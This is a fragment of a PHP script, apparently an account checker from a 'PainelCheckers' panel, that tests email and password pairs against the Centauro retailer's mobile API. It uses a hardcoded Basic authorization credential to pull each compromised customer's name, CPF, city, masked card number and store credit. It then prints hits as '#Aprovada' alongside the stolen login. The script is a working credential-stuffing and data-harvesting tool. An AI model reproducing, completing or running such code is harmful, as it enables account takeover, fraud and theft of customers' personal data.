...
$token = getStr($d1,'"token":"','",');	
	...
	$d4 = __curl('https://api.centauro.appsbnet.com.br/v2.2/cartoes', false, array(
    "accept-encoding: gzip",
    "authorization: Basic TW9iaWxlQXBwTTpjN2I1OTJhNg==",
    "connection: Keep-Alive",
    "host: api.centauro.appsbnet.com.br",
	...
	$d5 = __curl('https://api.centauro.appsbnet.com.br/v2.2/clientes/valetrocas', false, array(
    "accept-encoding: gzip",
    "authorization: Basic TW9iaWxlQXBwTTpjN2I1OTJhNg==",
    "connection: Keep-Alive",
    "host: api.centauro.appsbnet.com.br",
	...
	$uf = getStr($d3, '"uf":"','",');
	$cc = getStr($d4, '"numeroMascarado":"','",');
	$vale = getStr($d5, '"listaValeTroca":"','",');

	echo "<label class='badge badge-success'>#Aprovada | $email › $senha</label> Nome: $nome Cpf: $cpf Cidade: $cidade Estado: $estado Cartão: $cc Vale: $vale | <label class='badge badge-success'>#PainelCheckers</label><br>";
	}else{
	die('<font color="red" style="font-weight: #C0392B;">#Reprovada</font> '.$lista.'  <font color="#333333">#PainelCheckers</font>');
	}
?>
